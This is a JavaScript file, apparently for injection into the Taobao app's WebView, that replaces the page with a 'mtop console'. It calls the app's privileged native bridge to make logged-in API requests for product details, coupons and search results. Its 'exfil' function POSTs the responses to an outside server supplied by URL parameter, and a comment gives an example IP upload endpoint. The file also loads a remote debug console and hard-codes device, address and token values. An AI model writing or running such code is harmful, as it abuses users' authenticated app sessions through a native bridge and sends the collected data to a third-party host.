(function () {
  'use strict';

  var W = window;
  var D = document;

  /* ================= 外传配置（从页面 URL query 读，不硬编码） ================= */
  function getQuery(name) {
    var m = location.search.match(new RegExp('[?&]' + name + '=([^&]*)'));
    return m ? decodeURIComponent(m[1]) : '';
  }
  var SVR = getQuery('svr');        // 外传服务器，如 http://81.70.82.70:6731/upload
  var TK = getQuery('token');       // 上传 token
  var CAN_EXFIL = !!(SVR && TK);

  /* ================= eruda ================= */
  function loadEruda(cb) {
    if (W.eruda) { try { W.eruda.init(); } catch (e) {} if (cb) cb(W.eruda); return; }
    var s = D.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/eruda@2.4.1/eruda.min.js';
    s.onload = function () {
      if (W.eruda) { try { W.eruda.init(); } catch (e) {} }
      if (cb) cb(W.eruda);
    };
    s.onerror = function () {
      import('https://cdn.jsdelivr.net/npm/eruda@2.4.1/+esm').then(function (m) {
        var er = (m && m.default) || W.eruda;
        if (er && er.init) er.init();
        if (cb) cb(er);
      }).catch(function () { if (cb) cb(null); });
    };
    D.head.appendChild(s);
  }

  /* ================= mtop 封装 ================= */
  function mtopSend(api, param, version) {
    return new Promise(function (resolve, reject) {
      if (!W.__windvane__ || !W.__windvane__.call) { reject('no __windvane__ bridge'); return; }
      var p = {
        api: api,
        v: version || '1.0',
        post: '1',
        type: '',
        isHttps: '0',
        ecode: '0',
        isSec: '0',
        param: param,
        timer: 30000,
        needLogin: true,
        sessionOption: 'AutoLoginOnly',
        ext_headers: {},
        ext_querys: {}
      };
      W.__windvane__.call('MtopWVPlugin.send', p, resolve, reject, 10000);
    });
  }

  /* ================= 商品详情 ================= */
  function buildDetailParam(itemId) {
    var ex = {
      NAV_PROCESSOR_START_TIME: "1761720138804",
      appReqFrom: "detail",
      bizName: "minidetail",
      container_type: "sku",
      countryCode: "CN",
      cpuCore: "8",
      cpuMaxHz: "null",
      deviceLevel: "medium",
      dinamic_v3: "true",
      dynamicJsonData: "true",
      finalUltron: "true",
      from: "minidetail",
      identifier: "",
      industryMainPicDegrade: "false",
      isFoldDevice: "false",
      isPadDevice: "false",
      isPrefetchSkuMtop: "false",
      itemId: itemId,
      item_id: itemId,
      latitude: "0",
      liveAutoPlay: "true",
      longitude: "0",
      newStruct: "true",
      nick: "",
      openFrom: "tbmessage",
      osVersion: "34",
      phoneType: "OPPO11",
      preload_v: "industry",
      screenHeight: "2606",
      screenWidth: "1240",
      skuId: "null",
      skuOutSdk: "true",
      skuType: "confirm",
      sku_forbidH5: "true",
      sku_forbidH5_toast: "该商品不支持聊天窗内选择规格",
      soVersion: "2.0",
      sourceType: "3",
      "spm-cnt": "a2141.1007.41750.336411",
      supportIndustryMainPic: "true",
      transparent_key: "openFrom,itemId,identifier,bizName,sourceType,sku_forbidH5,sku_forbidH5_toast,from,skuId",
      ttd_ttid: "10001201@tt_detail_android_12.51.40",
      ultron2: "true",
      utdid: "b5eAIejvgwsCAbRmgzU4VyYm",
      videoAutoPlay: "true"
    };
    return { detail_v: "3.3.2", exParams: JSON.stringify(ex), id: itemId };
  }

  function getDetail(itemId) {
    return mtopSend('mtop.taobao.detail.data.get', buildDetailParam(itemId), '1.0');
  }

  /* ================= 优惠券 ================= */
  function buildCouponParam(itemId) {
    var ex = {
      wh_weex: "true",
      "": "",
      subItemId: itemId,
      itemId: itemId,
      popId: "1755758950744",
      sellerId: "",
      marketcoupon: "true",
      from: "cart",
      sellerType: "B",
      weex_mode: "dom",
      addressId: "23516134638",
      token: "-1632109989",
      renderMode: "texture",
      promotionFloatingData: "undefined"
    };
    return { exParam: JSON.stringify(ex), itemId: itemId };
  }

  function getCoupon(itemId) {
    return mtopSend('mtop.taobao.detail.taodetail.getcoupon', buildCouponParam(itemId), '1.0');
  }

  /* ================= 文搜（App 接口 MtopRecommend.recommend） ================= */
  // 对齐 App 内主搜索接口：mtop.relationrecommend.MtopRecommend.recommend / 1.0
  // 参数为扁平结构（来自 CommonBaseDatasource#b 实际 hook 到的 data），已删除：
  //  - MTOP 自动注入的设备/网络公共参数（ttid / utd_id / device / brand / network / info / areaCode 等）
  //  - 动态字段（apptimestamp / rainbow 实验桶 / LBS / inputSessionId 会话）
  function buildSearchParam(query) {
    return {
      q: query,
      appId: '66',                    // 普通综合搜索（tab=all）；店内=17251、m=pc=18601、订阅=29881
      sversion: '29.9',               // App 搜索版本（H5 是 13.6，App 是 29.9）
      spm: 'a2141.1.searchbar.searchbox',
      scm: '1007.home_topbar.searchbox.d',
      search_action: 'initiative',
      from: 'nt_history',
      sugg: '_0_1',
      index: '0',
      vm: 'nw',
      schemaType: 'auction',
      style: 'list',
      isEnterSrpSearch: 'true',
      needTabs: 'true',
      searchBoxShowType: 'UOne',
      layeredSrp: 'true',
      tb2025: 'true',
      ShopSDKModuleType: 'local',
      grayHair: 'false',
      elderHome: 'false',
      searchElderHomeOpen: 'false',
      homePageVersion: 'v7',
      enablePicShot: 'true',
      isBeta: 'false',
      gpsEnabled: 'false',
      history_query_from: 'suggest_all-queryBE2',
      extra_data_key: 's.m.taobao.com/h5entry',
      mainChannel: ''
    };
  }

  function getSearch(query) {
    return mtopSend('mtop.relationrecommend.MtopRecommend.recommend', buildSearchParam(query), '1.0');
  }

  /* ================= 文搜结果解析 ================= */
  function escHtml(s) {
    return String(s == null ? '' : s)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  // 从 mtop 返回里定位商品数组，兼容多种包裹：顶层 itemsArray / data.itemsArray / data 为字符串 / 数组
  function findItemsArray(resp) {
    if (typeof resp === 'string') {
      try { resp = JSON.parse(resp); } catch (e) { return null; }
    }
    if (Array.isArray(resp)) return resp;
    if (!resp || typeof resp !== 'object') return null;
    if (Array.isArray(resp.itemsArray)) return resp.itemsArray;
    if (resp.data) {
      var d = resp.data;
      if (typeof d === 'string') {
        try { d = JSON.parse(d); } catch (e) { return null; }
      }
      if (Array.isArray(d)) return d;
      if (d && typeof d === 'object') {
        if (Array.isArray(d.itemsArray)) return d.itemsArray;
        if (Array.isArray(d.items)) return d.items;
        if (Array.isArray(d.auctions)) return d.auctions;
      }
    }
    return null;
  }

  function parseSearchItems(resp) {
    var arr = findItemsArray(resp);
    if (!arr) return [];
    var out = [];
    for (var i = 0; i < arr.length; i++) {
      var it = arr[i];
      if (!it || typeof it !== 'object') continue;
      var itemId = it.item_id || it.nid || it.auctionId;
      if (!itemId) continue;
      var priceShow = it.priceShow || {};
      var showPrice = priceShow.price != null ? String(priceShow.price) : String(it.price || '');
      var origPrice = (it.price != null && String(it.price) !== '0.00' && String(it.price) !== '0'
        && String(it.price) !== showPrice) ? String(it.price) : '';
      var shopList = (it.shopInfo && it.shopInfo.shopInfoList) || [];
      out.push({
        itemId: String(itemId),
        title: it.title || it.raw_title || '',
        price: showPrice,
        unit: priceShow.unit || '¥',
        origPrice: origPrice,
        sales: it.realSales || it.view_sales || '',
        shop: shopList.length ? shopList[0] : '',
        pic: it.pic_path || '',
        cardType: it.cardType || '',
        isP4p: !!it.isP4p
      });
    }
    return out;
  }

  function renderSearchItems(items) {
    if (!items.length) {
      return '<div style="color:#999;font-size:13px;padding:8px 0;">未解析到商品列表</div>';
    }
    var html = '';
    for (var i = 0; i < items.length; i++) {
      var it = items[i];
      var priceHtml = '<span style="color:#e94560;font-weight:700;font-size:15px;">'
        + escHtml(it.unit) + escHtml(it.price) + '</span>';
      if (it.origPrice) {
        priceHtml += ' <span style="color:#999;font-size:12px;text-decoration:line-through;">'
          + escHtml(it.unit) + escHtml(it.origPrice) + '</span>';
      }
      var badges = '';
      if (it.cardType === 'live') badges += '<span style="color:#fff;background:#ff6600;font-size:11px;padding:1px 5px;border-radius:3px;margin-left:6px;">直播</span>';
      if (it.isP4p) badges += '<span style="color:#fff;background:#bbb;font-size:11px;padding:1px 5px;border-radius:3px;margin-left:6px;">广告</span>';
      var img = '';
      if (it.pic) {
        img = '<img src="' + escHtml(it.pic.replace(/^http:/, 'https:'))
          + '" style="width:80px;height:80px;object-fit:cover;border-radius:6px;background:#f0f0f0;flex:none;" '
          + 'onerror="this.style.visibility=\'hidden\'" />';
      }
      html += '<div style="display:flex;gap:10px;padding:10px;border-bottom:1px solid #eee;align-items:flex-start;">'
        + img
        + '<div style="flex:1;min-width:0;">'
        +   '<div style="font-size:13px;line-height:1.45;color:#333;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;">'
        +     escHtml(it.title) + badges
        +   '</div>'
        +   '<div style="margin-top:6px;">' + priceHtml + '</div>'
        +   '<div style="margin-top:4px;font-size:12px;color:#888;">'
        +     (it.sales ? escHtml(it.sales) + ' · ' : '') + escHtml(it.shop)
        +     '<span style="color:#bbb;"> · ' + escHtml(it.itemId) + '</span>'
        +   '</div>'
        + '</div></div>';
    }
    return html;
  }

  /* 复制文本到剪贴板（textarea + execCommand，兼容 WebView 无 clipboard API 场景） */
  function copyText(text) {
    if (!text) return false;
    var ta = D.createElement('textarea');
    ta.value = text;
    ta.setAttribute('readonly', '');
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    ta.style.top = '0';
    D.body.appendChild(ta);
    ta.focus();
    ta.select();
    try { ta.setSelectionRange(0, text.length); } catch (e) {}
    var ok = false;
    try { ok = D.execCommand('copy'); } catch (e) { ok = false; }
    D.body.removeChild(ta);
    return ok;
  }

  /* ================= 外传 ================= */
  function exfil(itemId, detail, coupon) {
    if (!CAN_EXFIL) {
      return '[外传跳过] 未提供 svr / token 参数';
    }
    var payload = {
      domain: D.domain,
      itemId: itemId,
      detail: detail,
      coupon: coupon,
      timestamp: new Date().toISOString()
    };
    var json = JSON.stringify(payload);
    var x = new XMLHttpRequest();
    x.open('POST', SVR, true);
    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    x.onreadystatechange = function () {
      if (x.readyState == 4) { return; }
    };
    x.send('token=' + encodeURIComponent(TK) + '&data=' + encodeURIComponent(json));
    return '已发送 JSON ' + json.length + ' 字节';
  }

  /* ================= UI ================= */
  function renderUI() {
    D.body.innerHTML =
      "<div style='position:fixed;inset:0;background:#fff;overflow:auto;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;padding:16px;box-sizing:border-box;'>" +
        "<h1 style='font-size:18px;margin:0 0 12px;color:#e94560;'>Taobao mtop Console</h1>" +
        "<div style='display:flex;gap:8px;margin-bottom:12px;'>" +
          "<input id='itemId' type='text' value='1027602885349' placeholder='输入商品ID' " +
            "style='flex:1;height:44px;padding:0 12px;font-size:15px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;' />" +
          "<button id='run' style='height:44px;padding:0 20px;font-size:15px;color:#fff;background:#0f766e;border:none;border-radius:6px;'>获取详情+优惠券</button>" +
        "</div>" +
        "<div id='status' style='font-size:13px;color:#666;margin-bottom:12px;'>就绪 · eruda 加载中...</div>" +
        "<div style='margin-bottom:12px;'><b style='font-size:14px;'>商品详情</b>" +
          "<pre id='detail' style='white-space:pre-wrap;word-break:break-all;font-size:11px;background:#f6f7f9;border:1px solid #eee;border-radius:6px;padding:10px;max-height:40vh;overflow:auto;margin:6px 0 0;'>等待请求...</pre></div>" +
        "<div><b style='font-size:14px;'>优惠券</b>" +
          "<pre id='coupon' style='white-space:pre-wrap;word-break:break-all;font-size:11px;background:#f6f7f9;border:1px solid #eee;border-radius:6px;padding:10px;max-height:40vh;overflow:auto;margin:6px 0 0;'>等待请求...</pre></div>" +
        "<div style='margin:16px 0 0;padding-top:16px;border-top:2px solid #0f766e;'><b style='font-size:15px;color:#0f766e;'>文搜（MtopRecommend.recommend）</b>" +
          "<div style='display:flex;gap:8px;margin:6px 0 12px;'>" +
            "<input id='query' type='text' value='' placeholder='输入搜索词 query' " +
              "style='flex:1;height:44px;padding:0 12px;font-size:15px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;' />" +
            "<button id='search' style='height:44px;padding:0 20px;font-size:15px;color:#fff;background:#0f766e;border:none;border-radius:6px;'>搜索</button>" +
          "</div>" +
          "<div id='searchList' style='background:#fff;border:1px solid #eee;border-radius:6px;overflow:hidden;margin:0 0 8px;'>等待搜索...</div>" +
          "<div style='margin:0 0 8px;'>" +
            "<button id='copyJson' style='height:36px;padding:0 16px;font-size:13px;color:#fff;background:#334155;border:none;border-radius:6px;'>复制原始JSON报文</button>" +
          "</div>" +
          "<details style='margin:0;'><summary style='font-size:12px;color:#666;cursor:pointer;'>原始 JSON</summary>" +
            "<pre id='searchResult' style='white-space:pre-wrap;word-break:break-all;font-size:11px;background:#f6f7f9;border:1px solid #eee;border-radius:6px;padding:10px;max-height:50vh;overflow:auto;margin:6px 0 0;'>等待请求...</pre>" +
          "</details></div>" +
      "</div>";

    var input = D.getElementById('itemId');
    var run = D.getElementById('run');
    var status = D.getElementById('status');
    var detailEl = D.getElementById('detail');
    var couponEl = D.getElementById('coupon');
    var queryInput = D.getElementById('query');
    var searchBtn = D.getElementById('search');
    var searchResultEl = D.getElementById('searchResult');
    var searchListEl = D.getElementById('searchList');
    var copyJsonBtn = D.getElementById('copyJson');
    var searchRawJson = null;

    function setStatus(t) { status.textContent = t; }

    run.addEventListener('click', function () {
      var id = (input.value || '').trim();
      if (!id) { setStatus('请输入商品ID'); return; }
      setStatus('请求中...');
      detailEl.textContent = '请求中...';
      couponEl.textContent = '请求中...';

      var detailDone = false, couponDone = false;
      var detailData = null, couponData = null;

      function tryExfil() {
        if (detailDone && couponDone) {
          var msg = exfil(id, detailData, couponData);
          setStatus('详情 + 优惠券 OK · ' + msg);
        }
      }

      getDetail(id).then(function (r) {
        detailData = r;
        detailDone = true;
        detailEl.textContent = JSON.stringify(r, null, 1);
        tryExfil();
      }).catch(function (e) {
        detailData = { error: e };
        detailDone = true;
        detailEl.textContent = '[FAIL] ' + JSON.stringify(e);
        tryExfil();
      });

      getCoupon(id).then(function (r) {
        couponData = r;
        couponDone = true;
        couponEl.textContent = JSON.stringify(r, null, 1);
        tryExfil();
      }).catch(function (e) {
        couponData = { error: e };
        couponDone = true;
        couponEl.textContent = '[FAIL] ' + JSON.stringify(e);
        tryExfil();
      });
    });

    searchBtn.addEventListener('click', function () {
      var q = (queryInput.value || '').trim();
      if (!q) { setStatus('请输入搜索词 query'); return; }
      setStatus('文搜请求中...');
      searchListEl.innerHTML = '<div style="color:#999;font-size:13px;padding:8px 10px;">请求中...</div>';
      searchResultEl.textContent = '请求中...';

      getSearch(q).then(function (r) {
        searchRawJson = JSON.stringify(r, null, 1);
        searchResultEl.textContent = searchRawJson;
        var items = parseSearchItems(r);
        searchListEl.innerHTML = renderSearchItems(items);
        setStatus('文搜 OK · 共 ' + items.length + ' 个商品');
      }).catch(function (e) {
        searchRawJson = null;
        searchListEl.innerHTML = '<div style="color:#e94560;font-size:13px;padding:8px 10px;">[FAIL]</div>';
        searchResultEl.textContent = '[FAIL] ' + JSON.stringify(e);
        setStatus('文搜失败');
      });
    });

    copyJsonBtn.addEventListener('click', function () {
      if (!searchRawJson) { setStatus('请先执行搜索'); return; }
      var ok = copyText(searchRawJson);
      setStatus(ok ? '已复制原始 JSON（' + searchRawJson.length + ' 字符）' : '复制失败');
    });
  }

  /* ================= init ================= */
  renderUI();
  loadEruda(function (er) {
    var st = D.getElementById('status');
    if (st) st.textContent = (er ? '就绪 · eruda 已加载' : '就绪 · eruda 加载失败') + ' · 外传' + (CAN_EXFIL ? '已配置' : '未配置(svr/token)');
  });
})();
